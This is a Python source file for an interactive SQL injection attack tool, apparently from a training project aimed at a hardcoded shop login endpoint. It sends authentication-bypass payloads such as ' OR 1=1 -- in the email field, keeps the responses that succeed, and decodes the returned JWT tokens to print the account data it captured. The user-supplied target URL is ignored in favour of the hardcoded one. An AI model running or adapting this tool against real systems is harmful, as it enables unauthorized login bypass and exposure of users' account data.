
import os
import json
import base64
from tqdm import tqdm
from rich import print
import requests
# from components.banner import sql_banner

base_url = os.environ.get("BASE_URL")
token_list = []

def press_enter_to_continue():
    input(f"Press Enter to continue...")
    pass


def jwt_token_decode(jwt_token):
    try:
        jwt_segments = jwt_token.split(".")
        payload_segment = jwt_segments[1]

        # Fix padding for base64 decoding
        padding = len(payload_segment) % 4
        if padding > 0:
            payload_segment += "=" * (4 - padding)

        # Replace characters to ensure valid base64 decoding
        payload_segment = payload_segment.replace("-", "+").replace("_", "/")

        # Decode and parse JSON
        decoded_payload = base64.b64decode(payload_segment).decode("utf-8")
        jwt_payload = json.loads(decoded_payload)

        return jwt_payload
    except Exception as e:
        print(e)

def attack_sql_injection(url):
    response_result = {}
    payloads = {
        "default": ["' OR 1=1 --", "' OR '1'='1' --", "admin' or '1'='1'--", "' OR 1=1;"],
        "medium": [],  # read data from file
        "high": []
    }

    # new_url = url + '/rest/user/login'
    new_url = url
    selected_payload = []

    print("Select the level of payloads:")
    print("[bold green][bold red][1][/bold red]. Defualt[/bold green]")
    print("[bold green][bold red][2][/bold red]. Medium[/bold green]")
    print("[bold green][bold red][3][/bold red]. High[/bold green]")
   
    level = int(input("Please choose your payload option from 1 to 3: "))

    if level == 1:
        selected_payload = payloads["default"]
    elif level == 2:
        try:
            with open("payloads/medium_payload", "r") as medium_payload:
                for line in medium_payload:
                    # strip newline characters
                    payloads["medium"].append(line.strip())
        except FileNotFoundError:
            print("[bold red]File not found![/bold red]")
        selected_payload = payloads["medium"]
    elif level == 3:
        try:
            with open("payloads/high_payload", "r") as high_payload:
                for line in high_payload:
                    # strip newline characters
                    payloads["high"].append(line.strip())
        except FileNotFoundError:
            print("[bold red]File not found![/bold red]")
        selected_payload = payloads["high"]
    else:
        print("[bold red]Invalid level of payload![/bold red]")

    with tqdm(total=len(selected_payload), desc="Testing Payloads", unit="payload") as pbar:
        for payload in selected_payload:
            params = {'email': payload, 'password': 'password123'}
            try:
                response = requests.post(new_url, json=params)
            except requests.exceptions.RequestException as e:
                print(e.response)
            else:
                if response.status_code == 200:
                    response_result[payload] = response.json()
                    
            pbar.update(1)
    print()
    summary_result(new_url, level, selected_payload, response_result)
    print()


def summary_result(new_url, level, selected_payload, response_result):
    print("[bold cyan]---------| Finished the scanning attack |---------[/bold cyan]")
    print("[bold blue]---------| SUMMARY |---------[/bold blue]")
    print(f"[bold yellow]Target URL:[/bold yellow] {new_url}")
    if "level" in locals():
        if level == 1:
            print(f"[bold yellow]Payload level:[/bold yellow] Default")
        elif level == 2:
            print(f"[bold yellow]Payload level:[/bold yellow] Medium")
        elif level == 3:
            print(f"[bold yellow]Payload level:[/bold yellow] High")
        else:
            print("[bold yellow]Payload level:[/bold yellow] Invalid")
    print(
        f"[bold yellow]Total number of payloads:[/bold yellow] {len(selected_payload)}")
    print(
        f"[bold yellow]Total number of payloads successful:[/bold yellow] {len(response_result)}")
    print(
        f"[bold yellow]Total number of payloads failed:[/bold yellow] {len(selected_payload) - len(response_result)}")
    print(f"[bold yellow]Payload with result : [/bold yellow] ")
    print(json.dumps(response_result, indent=4))
    print("decode jwt token: ")
    for payload in response_result:
        token = response_result[payload]['authentication']['token']
        decoded_token = jwt_token_decode(token)
        print(decoded_token['data'])
    
    press_enter_to_continue()


def call_sql_injection():
    # use with while loop to allow user to run the tool again
    while True:
        print("[bold blue]-----------| SQL Injection  |-----------[/bold blue]")
        # sql_banner()
        print("[bold green][bold red][1][/bold red]. Attack[/bold green]")
        print("[bold green][bold red][2][/bold red]. Exit[/bold green]")

        choice = int(input("Please choose an option (1 or 2): "))

        if choice == 1:
            print(f"[bold yellow]example: {base_url}/login[/bold yellow]")
            taget_url = input(f"Enter the target url:")
            url = "https://myshop.cstad.shop/rest/user/login"
            attack_sql_injection(url)
        elif choice == 2:
            print(
                "[bold blue]-----------| END OF SQL Injection  |-----------[/bold blue]")
            break
        else:
            print("[bold red]Invalid choice. Please select 1 or 2.[/bold red]")

call_sql_injection()